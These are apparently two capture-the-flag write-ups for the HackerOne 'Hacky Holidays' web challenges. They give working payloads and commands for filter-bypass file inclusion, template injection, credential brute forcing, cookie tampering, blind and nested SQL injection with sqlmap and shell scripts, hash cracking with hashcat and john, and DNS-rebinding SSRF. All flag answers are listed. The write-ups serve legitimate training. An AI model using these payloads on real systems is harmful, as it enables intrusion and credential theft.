2-w burp-parameter-names.txt \
3-H 'Cookie: token=NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY%3D' \
4-t 4 -mc all  -fs 155
we understand that the parameter is called (not very surprisingly after all) uuid.
This call gets the 4th flag
Code 332 Bytes
1GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
2Host: hackyholidays.h1ctf.com
3
4{
5  "uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
6  "username":"grinch",
7  "address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},
8  "flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
In the end, the session cookie probably was not necessary.
flag5 /secure-login
The login form seems to indicate that there are different responses for invalid username vs. just wrong password.
So we first try to discover a valid usernameexploting the different responses (with a list of common usernames).
After finding that access is a valid user, we try to bruteforce his password, again with a list of very common password.
It's just a matter of seconds to obtain a valid set of credentials:
Code 33 Bytes
1username=access&password=computer
After loggin in we get a cookie like this one
securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D;
which is base64 encoding of
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
Changing the cookie and setting admin:true immediately brings us to a page where we can download
my_secure_files_not_for_you.zip
This zip file is password protected but john the ripper, and in particular zip2john, will easily reveal the password (hahahaha)
zip2john my_secure_files_not_for_you.zip >zip.hashes
john zip.hashes ## this gives you the password
Finally in flag.txt extracted from zip file we find
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
We also find a gross private picture of the grinch, not very interesting after all.
flag6 /my-diary/
Grinch diary screams for LFI (Local File Inclusion)
https://hackyholidays.h1ctf.com/my-diary/?template=entries.html
and at least it's true in its current directory. If we simply try to get the index.php we otbain the source code:
Code 766 Bytes
1GET /my-diary/?template=index.php HTTP/1.1
2Host: hackyholidays.h1ctf.com
3
4...
5
6<?php
7if( isset($_GET["template"])  ){
8    $page = $_GET["template"];
9    //remove non allowed characters
10    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
11    //protect admin.php from being read
12    $page = str_replace("admin.php","",$page);
13    //I've changed the admin file to secretadmin.php for more security!
14    $page = str_replace("secretadmin.php","",$page);
15    //check file exists
16    if( file_exists($page) ){
17       echo file_get_contents($page);
18    }else{
19        //redirect to home
20        header("Location: /my-diary/?template=entries.html");
21        exit();
22    }
23}else{
24    //redirect to home
25    header("Location: /my-diary/?template=entries.html");
26    exit();
The usage of strreplace has a classic vulnerability: it will not recursively remove all admin.php occurences. If we start from
XXXadmin.phpYYY
what remains is
XXXYYY
So for instance
adminadmin.php.php --> admin.php
The following payload gets the source code of secretadmin.php (which contains the flag), despite the extra layer of "security":
Code 200 Bytes
1GET /my-diary/?template=secretsecretadminadmin.php.phpadminadmin.php.php HTTP/1.1
2
3...
4
5<?php
6if( $_SERVER["REMOTE_ADDR"] == '127.0.0.1' ){
7?>
8
9[...SNIP...]
10
11flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
flag7 /hate-mail
Examining the mail preview function
Code 223 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3
4preview_markup=%7B%7Btemplate%3Acbdj3_grinch_header.html%7D%7D&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D
our attention is immediately captured by that {{template:file.html}}. We begin tampering in search of some kind of LFI, but that only exposes the existance of a templates/ subdirectory. Directory Index is enabled there, so we get to knwow about a particular file
38dhs_admins_only_header.html
A simple GET of the file gives us forbidden and also tampering with the preview_markup parameter only gives us an error message:
Code 299 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3	preview_markup=%7B%7Btemplate%3A38dhs_admins_only_header.html%7D%7D&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D
4
5...
6
7You do not have access to the file 38dhs_admins_only_header.html
Key vulnerability here is that the {{template:file}} construction seems to have different validation if used with preview_markup or preview_data parameter
So if in preview_markup we define the {{name}} placeholder and try to get the file within this placeholder in preview_data we are able to access the admin file and obtain the flag:
Code 260 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3
4preview_markup={{name}}&preview_data={"name"%3a"{{template%3a38dhs_admins_only_header.html}}","email"%3a"alice%40test.com"}
5
6...
7  <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
flag 8 /forum
Here our objective is accessing the admin area. By basic recon we know that there are at least user grinch and user max. Basic password bruteforcing does not give any result, and also tampering with message and section identifiers (/forum/N/M)
Searching for common files and directories with ffuf only revelas a phpmyadmin.
ffuf -t 4 -u https://hackyholidays.h1ctf.com/forum/FUZZ -w common.txt -mc all -fc 404
...
1 [Status: 200, Size: 2249, Words: 788, Lines: 64]
2 [Status: 200, Size: 1885, Words: 512, Lines: 58]
login [Status: 200, Size: 1569, Words: 396, Lines: 34]
phpmyadmin [Status: 200, Size: 8880, Words: 956, Lines: 79]
Fuzzing gives us nothing so we revert to search for the source code of the forum, maybe is on github. This "google dork"
"Grinch Forum" site:github.com
reveals
https://github.com/Grinch-Networks/forum
There are no evident vulnerbilities in the source code so we look at the history and find a particular commit where the auhtor forgot to properly purge sensitive data:
Code 527 Bytes
1commit efb92ef3f561a957caad68fca2d6f8466c4d04ae
2Author: Adam <adam@umbrella.info>
3Date:   Mon Dec 7 16:36:07 2020 +0000
4
5    small fix
6
7diff --git a/models/Db.php b/models/Db.php
8index 5bea1f5..1dc435c 100755
9--- a/models/Db.php
10+++ b/models/Db.php
11@@ -131,7 +131,7 @@ class Db {
12      */
13     static public function read(){
14         if( gettype(self::$read) == 'string' ) {
15-            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
16+            self::$read = new DbConnect( false, '', '','' );
Those credentials work on phpmyadmin where we are able to find what looks like md5 hash for the passwords:
Code 92 Bytes
11 	grinch 	35D652126CA1706B59DB02C93E0C9FBF    1
22 	max   	388E015BC43980947FCE0E5DB16481D1 
A visit on crackstation.net immediately reveals the grinch password
35D652126CA1706B59DB02C93E0C9FBF md5 BahHumbug
With these credentials we are able to access a message which finally reveals the Grinch secret plan:
Code 273 Bytes
1https://hackyholidays.h1ctf.com/forum/3/2
2
3
4We've launched our recon server, gathered intelligence and pin pointed Santa's location!
5Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!
6
7flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
We must find that server, and hopefully launch the Grinch weapons against itself!
 flag9 /evil-quiz
We begin the quiz with name pippo
POST /evil-quiz
name=pippo
and post some answers
POST /evil-quiz/start HTTP/1.1
Host: hackyholidays.h1ctf.com
ques_1=4&ques_2=3&ques_3=2
What immediately got our attention was this sentence in the score page:
There is 1 other player(s) with the same name as you!
Our first interpretation was that maybe we have to trick this other user to do something via XSS or html link, maybe tampering with our name parameter. But, what was strange, was that even with "xss names" there was always some user with our same username.
After some tampering trying to evade xss filters we got a different message
There is 0 other player(s) with the same name as you!
It was not immediately evident why, until we tested one character at a time and we learnt that it was the ' to make the differenc. That smells like SQL Injection.
Actually at some point we begin getting these answers:
Code 180 Bytes
1name=NOME' or 22=1 or '2'='1  ---> There is 0 other player(s) with the same name as you!
2name=NOME' or  1=1 or '2'='1  ---> There is 24358 other player(s) with the same name as you
Bingo! It is a second order blind sql injection. Sqlmap to the rescue: given a valid session cookie and at least one complete answer to questions in that session (no matter the evil score) these command is sufficient to extract all the information we need:
Code 280 Bytes
1sqlmap -u 'https://hackyholidays.h1ctf.com/evil-quiz' \
2--data 'name=NOME' \
3--second-url 'https://hackyholidays.h1ctf.com/evil-quiz/score' \
4--random-agent --not-string 'There is 0 other player' \
5--technique=B --level=3 --risk=3 \
6--cookie 'session=***'  -D quiz -T admin --dump
Key here are a couple of things to note here:
--second-url parameters tells sqlmap the page to check our injection results in a different page
we explicitly give a --not-string to look for false result
--risk 3 is necessary to let sqlmap try OR based blind injection
db and table were identified by previious runs of sqlmap, what you have above is the final command
you cannot specify more than 1 thread because of second order page request (otherwhise one thread will interfere with other threads' result)
Seeing this message told us that we were on the right path
Code 307 Bytes
1...
2[17:19:23] [INFO] POST parameter 'name' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
3...
4Parameter: name (POST)
5    Type: boolean-based blind
6    Title: OR boolean-based blind - WHERE or HAVING clause
7    Payload: name=-3268' OR 6136=6136-- ibKa
8    Vector: OR [INFERENCE]
And finally, with some patience we get the info we were looking for:
Code 227 Bytes
1Database: quiz
2Table: admin
3[1 entry]
4+----+----------+-------------------+
5| id | username | password          |
6+----+----------+-------------------+
7| 1  | admin    | S3creT_p4ssw0rd-$ |
8+----+----------+-------------------+
With admin credentials we immediately get the flag:
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
flag10 /signup-manager
Simple fuzzing reveals nothing very useful apart the existence of and admin.php page which is not directly accessibile via HTTP.
Comment in the home page reveals existence of a README.md file4:
Code 57 Bytes
1<!-- See README.md for assistance -->
2<!DOCTYPE html>
3...
This file describes the signupmanager source code which is readily available as signupmanager.zip.
It is clear that we have to create a user that has admin rights, but it seems not possible to overflow the string length, given that all paramters are quite strongly filtered:
password is hashed
username, first and last name are all subject to length restrictions, for instance
Code 83 Bytes
1$fistname=substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
It remains only the age paramter which is subject to these restrictions and conversions:
Code 181 Bytes
1if (!is_numeric($_POST["age"])) {
2	$errors[] = 'Age entered is invalid';
3}
4if (strlen($_POST["age"]) > 3) {
5	$errors[] = 'Age entered is too long';
6	
7$age = intval($_POST["age"]);
8}
Apparentely it won't be possibile to get an "overflow" but PHP is not strongly typed an setting age 9e9 we pass first check (it's a numeric value, in scientific notation), and as a string it's only 3 characters long. But fortunately for us
Code 37 Bytes
1php > print intval("9e9");
29000000000
With this in mind, we are able to get correct length for lastname in order to have a Y as last character of our user line written on disk:
The following paylod finally gives us a valid admin user
Code 148 Bytes
1POST /signup-manager/ HTTP/1.1
2Host: hackyholidays.h1ctf.com
3
4action=signup&username=grinch54321&password=a&age=9e9&firstname=aaa&lastname=bbbbbbbbY
The flag was
Code 203 Bytes
1<p class="text-center">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>
2<p class="text-center">You made it through, continue to your next task <a href="/r3c0n_server_4fdk59">here</a></p>
3            </div>
Tommorrow let's hope to get into the Gringh recon server and maybe DDOS it!
flag11
We start from https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 where we read:
We are currently developing an API, apologies for anything that doesn't work quite right
Every api endpoint seems to give this error
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api
error "This endpoint cannot be visited from this IP address"
Probably we have to find a way to trick the server in sending requests to this API endpoints via some SSRF.
Initial tought is about the image paramter in these requests:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEyNTQzMTRiODI5MmI4Zjc5MDg2MmQ2M2ZhNWRjZThmLmpwZyIsImF1dGgiOiI5OWMwMGQzZWVmNzA4NDdhYzQ4ODhhZTg1ZDBiNGM3ZSJ9
Code 725 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
2{"image":"r3c0n_server_4fdk59\/uploads\/13d74554c30e1069714a5a9edda8c94d.jpg","auth":"94fb398d78b36e7c079e7560ce9df721"}
3{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"}
4{"image":"r3c0n_server_4fdk59\/uploads\/32febb19572b12435a6a390c08e8d3da.jpg","auth":"76ba061d356c6264a6005216e1776ba6"}
5{"image":"r3c0n_server_4fdk59\/uploads\/0a382c6177b04386e1a45ceeaa812e4e.jpg","auth":"ec5a9920e177ccc84974146f93ae04b0"}
6{"image":"r3c0n_server_4fdk59\/uploads\/1254314b8292b8f790862d63fa5dce8f.jpg","auth":"99c00d3eef70847ac4888ae85d0b4c7e"}
After spending a lot of time trying to reverse engineer the algorithm which signs (via auth paramter) the image paramter.
It was not (at least trying with common passwords as salts) a weak hash of SALT+image, and also length extension attack did not produce anything.
So back to the basic recon.
Initially we did not put much attention on the hash paramter in /r3c0n_server_4fdk59/album?hash= but it is clearly vulnerable so sql injection.
In a few seconds sqlmap reveals
Code 849 Bytes
1Database: recon
2Table: album
3[3 entries]
4+----+--------+-----------+
5| id | hash   | name      |
6+----+--------+-----------+
7| 1  | 3dir42 | Xmas 2018 |
8| 2  | 59grop | Xmas 2019 |
9| 3  | jdh34k | Xmas 2020 |
10+----+--------+-----------+
11
12
13Database: recon
14Table: photo
15[6 entries]
16+----+----------+--------------------------------------+
17| id | album_id | photo                                |
18+----+----------+--------------------------------------+
19| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
20| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
21| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
22| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
23| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
24| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
25+----+----------+--------------------------------------+
No other information seems available. Key to understand how to proceed was observing that in the following request the first UNION paramter is used to get the photo from the db
Code 180 Bytes
1GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+1,NULL,NULL--+- HTTP/1.1
2Host: hackyholidays.h1ctf.com
3
4[picture from album 1 returned]  <--- THIS IS THE KEY DISCOVERY!!! 
We are able to confirm that there is a SQLi inside a SQLi (inserting the second one as first union column of the first injection) like in the following example:
GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+"1' order by 3--+-",2,3--+- HTTP/1.1
Finally we are able to insert our data like in the following example, obtaining a valid signature:
Code 337 Bytes
1GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+"-1'+union+all+select+NULL,NULL,0x41--+-",2,3--+- HTTP/1.1
2Host: hackyholidays.h1ctf.com
3
4     <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL0EiLCJhdXRoIjoiNjAxNDZjMGY5YTQ0YTgyNWZhYTIzZTJkZDE3OWMxM2QifQ==">
which is
{"image":"r3c0n_server_4fdk59\/uploads\/A","auth":"60146c0f9a44a825faa23e2dd179c13d"}
Now we proceed with the assumtion that this image path is used by the server to interrogate the api
We try some common endpoints with this script
Code 401 Bytes
1#!/bin/sh
2
3while read word; do
4
5/bin/echo -n "$word: "
6path=$(/bin/echo -n "../api/$word" |xxd -p | tr -d '\n')
7picurl=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\?hash=\'+UNION+ALL+SELECT+\"-1\'+union+all+select+NULL,NULL,0x${path}--+-\",2,3--+- -s|grep data= |sed 's/^.*src="\([^"]*\)">/\1/')
8echo $picurl
9
10curl -s "https://hackyholidays.h1ctf.com$picurl" |grep -v 404
11echo
12done
The script can be run via: cat wordlist.txt | script.sh
We find two endpoints observing the different responses given by the server:
ping
user
While testing the user endpoint we notice two different responses for
user?xxx=1
user?username=x
Code 463 Bytes
1user?xxx=1: /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/eHh4PTEiLCJhdXRoIjoiY2FhNzlmNjdiZDZlZDlmOGE5MGI4NjJjOGZmY2RkMGIifQ==
2Expected HTTP status 200, Received: 400
3
4user?username=x: /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9eCIsImF1dGgiOiI2ZDRhZDg4NTRmNzk5ZTI0NmZmZTEwZTZiZGFkYjE2YiJ9
5Expected HTTP status 200, Received: 204
This means that user endpoint expects a username parameter, and later on we also find a password paramter.
But now what? Key observation was that by inserting a % as username we have again different response:
Code 225 Bytes
1user?username=%: /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9JSIsImF1dGgiOiIzYjZkNmVmOGRkN2JiNzUxZmI1ZTIwMDJhOGRhZDdhMSJ9
2Invalid content type detected
This is working but the server does not return a valid image as expected by the caller.
This probably means that username paramter is inserted in a query like
username LIKE '$username'
This mean we are not able to extract data directly but we should be able to enumerate one character at a time:
username=a%
username=b%
...
username=g%
At g% we get a diffrrent response (Invalid content type) so maybe...
username=gr%
username=gri%
This can be scripted with something like this:
Code 519 Bytes
1#!/bin/sh
2
3start=$1
4for word in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
5/bin/echo -n "$word: "
6path=$(/bin/echo -n "../api/user?pass=$start$word%" |xxd -p | tr -d '\n')
7echo path: ${path}
8picurl=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\?hash=\'+UNION+ALL+SELECT+\"-1\'+union+all+select+NULL,NULL,0x${path}--+-\",2,3--+- -s|grep data= |sed 's/^.*src="\([^"]*\)">/\1/')
9echo $picurl
10
11curl -s "https://hackyholidays.h1ctf.com$picurl"  | grep -i invalid
12echo
13done
Example usage: ./user-enumeration-script.sh grin
After some tedious work we found the credentials grinchadmin s4nt4sucks
These credentials work on /attack-box button giving us flag11:
flag{07a03135-9778-4dee-a83c-7ec330728e72}
Tomorrow, let's see what is inside this evil box!
flag12
The grinch attack box fires DDOS against given IPs
203.0.113.33
203.0.113.53
203.0.113.213
Attacks are launched via this kind of request
GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1
that redirects you on a page with many similar requests that give the Grinch a feedback on his ddos success of failure
GET /attack-box/launch/332e283ebf958178fdae26345b921c68.json?id=0 HTTP/1.1
Attack requests contain (base64 encoded) something like
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
It is evident from tampering with the target value, that there is some kind of authentication: target of the attack and hash must match.
{"target":"203.0.113.33", "hash":"5f2940d65ca4140cc18d0878bc398955"}
{"target":"203.0.113.53", "hash":"2814f9c7311a82f1b822585039f62607"}
{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
While in flag11 there probably was a sound hashing mechanism (like HMAC), here it's easy to find a problem
because the Grinch used the infamous combination of md5($salt.$ip), choosing the salt from well known passwords.
By concatenating the first ip 203.0.113.33 with password chosen from the famous rockyou list and by
using hashcat we are able to see that the first hash corresponds to this:
5f2940d65ca4140cc18d0878bc398955:mrgrinch463203.0.113.33
Following commands show how we build a wordlist with the concatened IP address used as input for haschat:
Code 473 Bytes
1cat rockyou.txt | awk '{print $0"203.0.113.33"}' > list.txt
2hashcat -O -m0 -a0 hash.txt list.txt 
3
4Dictionary cache built:
5* Filename..: list.txt
6* Passwords.: 14344392
7* Bytes.....: 312054211
8* Keyspace..: 14343895
9* Runtime...: 2 secs
10
115f2940d65ca4140cc18d0878bc398955:mrgrinch463203.0.113.33
12                                                 
13Session..........: hashcat
14Status...........: Cracked
15Hash.Name........: MD5
16Hash.Target......: 5f2940d65ca4140cc18d0878bc398955
So the salt is mrgrinch463
This is easily confirmed by creating this request, now lecit.
{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}
Unfortunately this only gives
Code 176 Bytes
1Host Information for: 127.0.0.1
2Local target detected, aborting attack
3Setting Target Information
4Getting Host Information for: 127.0.0.1
5Local target detected, aborting attack
We then started to use hostnames instead of ip addresses but we got strange responses from the server which put us in a wrong direction (maybe too many hackers trying to DDOS the Grinch server with many requests...).
Anyay, when situation stabilizes it is clear that some basic trick do not work, like using 127.0.0.1.xip.io. The grinch server specifically resolves hostname
and checks that a DDOS is not launched against itself: 127.0.0.1. That is definitely our target, wherever the Grinch hides.
Given the extensive checks that the grinch does to see if his DDOS is successful, an idea comes to mind. What if
whe set up a name server that responds with a non local ip on first requests, and then change the resolution to 127.0.0.1?
Maybe second time the check against local IPs is not in place (a classic TOCTOU - Time Of Check Time Of Use - vulnerability).
Our hypotesis is based on the observation of this beavhiour:
Code 408 Bytes
1Setting Target Information
2Getting Host Information for: 192.168.1.1.xip.io
3Host resolves to 192.168.1.1
4Spinning up botnet
5Launching attack against: 192.168.1.1.xip.io / 192.168.1.1
6ping 192.168.1.1
764 bytes from 192.168.1.1: icmp_seq=1 ttl=118 time=22.9 ms
864 bytes from 192.168.1.1: icmp_seq=2 ttl=118 time=21.2 ms
964 bytes from 192.168.1.1: icmp_seq=3 ttl=118 time=15.9 ms
10Host still up, maybe try again?
Get host information: resolves, check is different that 127.0.0.1
then attack
Maybe in the attack phase 127.0.0.1 is not checked again.
So we started our fake nameserver using dnschef
dnschef -i 0.0.0.0 --fakeip 192.168.1.1
having in mind that we should be quite quick and launch it again with different options:
dnschef -i 0.0.0.0 --fakeip 127.0.0.1
What happens on the grinch server is described below:
first check for hostname, it resolves to a non local ip so is good and botnet is spinned up:
Code 353 Bytes
1GET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=0 HTTP/1.1
2
3[{"id":"3348","content":"Setting Target Information","goto":false},{"id":"3350","content":"Getting Host Information for: x.*********.tk","goto":false},{"id":"3351","content":"Host resolves to 192.168.1.1","goto":false},{"id":"3352","content":"Spinning up botnet","goto":false}]
later on, the check is not in place and our server resolves to 127.0.0.1:
Code 255 Bytes
1GET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=3352 HTTP/1.1
2[{"id":"3358","content":"Launching attack against: x.*********.tk \/ 127.0.0.1","goto":false},{"id":"3359","content":"No Response from attack server, retrying...","goto":false}]
After all the DDOS is launched and we got confirmation from the Grinch attack box:
Code 205 Bytes
1GET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=3360 HTTP/1.1
2[{"id":"3362","content":"No Response from attack server, retrying...","goto":"\/attack-box\/challenge-completed-a3c589ba2709"}]
Finally we are redirected and we see the message:
Code 112 Bytes
1Well done! You've taken down Grinch Networks and saved the holidays!
2
3flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
Merry Xmas!

flag{48104912-28b0-494a-9995-a203d1e261e7}
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
flag{b705fb11-fb55-442f-847f-0931be82ed9a}
flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
flag{99309f0f-1752-44a5-af1e-a03e4150757d}
flag{07a03135-9778-4dee-a83c-7ec330728e72}
flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
Impact
we are able to dos 127.0.0.1



==================================================

Report File: 1066007.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Uncontrolled Resource Consumption

Contents:

Intro:
12 days of challenges - some more challenging than others! This holiday CTF had all 12 challenges hosted on the website https://hackyholidays.h1ctf.com/
<image_0>
Challenge 1:
I started by significantly overthinking all of the early challenges in this competition. When this CTF started the home page did not have the "apps" button as seen in the screenshot above, and simply had the "Keep Out" image and the falling snow.
I checked the HTML source and didn't find anything much. After checking a couple more obvious things, I started looking into the "falling snow" background, which was a .mp4 file. Perhaps there was a single frame with the flag in it? Examining the file showed some interesting details like the file paths used for creating the animation (H:\NahamSec\Grinch\Grinch Launch.aep):
<image_1>
Unfortunately, this challenge had nothing to do with the webpage source code, images or movie file. The flag turned out to be in robots.txt! The contents of robots.txt was:
Code 85 Bytes
1User-agent: *
2Disallow: /s3cr3t-ar3a
3Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
This provided the first flag, and the path to the second day's challenge
Challenge 2
The path /s3cr3t-ar3a returned a message "Come back tomorrow" until day 2 started. Once the challenge kicked off, the following page could be seen:
<image_2>
This challenge, similar to the last, was even easier than it looked. The HTML source for the page included an innocent looking reference to /assets/js/jquery.min.js. Examining this file showed that data was obfuscated into the Javascript:
<image_3>
There was no need to deobfuscate the data however. Examining the Javascript showed that it would write the data into the DOM of the page. Which means that the Web Developer Inspector built in to the browser could be used to simply view the data. This revealed the following:
Code 131 Bytes
1<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
Once again, we now have the flag for the challenge and the page for the next day.
Challenge 3 - People Rater
The /apps page was used to host the next 8 challenges. The first one (challenge 3) was the "People Rater" challenge. This challenge displayed a list of people and the Grinch's rating of them. Clicking a person would display the rating, which was always "Disgusting".
An intercepting proxy was used and showed that when a person was clicked, an API request similar to the following was made:
Code 66 Bytes
1https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6NH0=
The id parameter clearly contains Base64 encoded data. Decoding it shows:
Code 8 Bytes
1{"id":4}
ID 1 never appears in the list to click on, so we can manually encode it and call this API with the following URL:
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=
This returns the following result, which includes the flag for this challenge:
Code 135 Bytes
1{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
Challenge 4 - Swag Shop
Challenge 4 was a fake web store. There were 3 items for sale, but a login was required to purchase any items. Attempting to brute force the login was not successful. After trying several ways to break the web store, wfuzz was used with a small word list to attempt to find other pages that might not be linked. This revealed the following page:
Code 54 Bytes
1https://hackyholidays.h1ctf.com/swag-shop/api/sessions
This page returned a list of sessions as Base64 data:
<image_4>
The Base64 data included a value, "Cookie" when decoded. I initially tried to use the session data to populate my own login cookie, however this was not successful. I even tried every single session ID!
One of the session data strings also had the value "user": "user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043". After more wfuzz scans I identified an endpoint user that accepted a parameter uuid. This then allowed for a user to be looked up with the following URL:
Code 90 Bytes
1https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
The response had the flag:
Code 216 Bytes
1{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
Challenge 5 - Secure Login
This challenge started off very straightforward. The challenge started with a "login" page. Entering a test login (admin/admin) returned the error:
Code 16 Bytes
1Invalid Username
This strongly indicates that we need to first find the correct username. I tried an LDAP injection as a test, but this did not uncover anything. Next I moved to a brute force attack. This quickly showed that the username access could be used. With that username, the server now returned Invalid Password as the message. Bruteforcing the password field showed the password was computer.
The challenge was not done here however! After logging in, the website simply said No Files To Download. Brute forcing API paths did not reveal anything. Examining the cookie that was set after login however revealed the next step. The cookie value was eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D. Base64 decoded this becomes: {"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}. I quickly changed "admin" to "true", and reencoded the cookie. Now when accessing the file list, one file was available for download:
Code 31 Bytes
1my_secure_files_not_for_you.zip
We still are not done! After downloading this zip file I discovered that it is password protected. The password turned out to be pretty easy, John The Ripper quickly found it to be hahahaha:
<image_5>
This allowed flag.txt to be extracted and its value was: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
Challenge 6 - My Diary
This challenge starts on the page: https://hackyholidays.h1ctf.com/my-diary/?template=entries.html. The page displays a list of "diary" entries for the Grinch. I ended up stuck on this one for waaay longer than I should have been. The ?template=entries.html parameter was the obvious target for attack, but changing it to any other value simply returned a 404. Accessing entries.html directly was successful, but only returned the exact same contents as the regular page.
I ran wfuzz several times with no results. I tried path traversal attacks with some success (?template=../ returned a blank page instead of a 404). But still nothing. Finally with an expanded wordlist for wfuzz I hit the parameter ?template=index.php. No other challenges had referenced pages with a .php extension, so I had not tried this for any of them. I also ran in to an issue where Burp Intruder's filter function had a bug (which it has had forever). The filter functionality of it incorrectly hides results while the scan is running. It only works properly after an intruder run has completed. Using wfuzz instead of intruder finally revealed the correct page. The contents of the index.php page can be seen below:
<image_6>
This PHP script is filtering input to block access to secretadmin.php We can defeat this filter by using the following URL:
https://hackyholidays.h1ctf.com/my-diary/?template=secretadmsecretadmadmin.phpin.phpin.php
This reveals the calendar entry for the Grinch (Launch DDOS against Santa's Workshop), and the flag: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
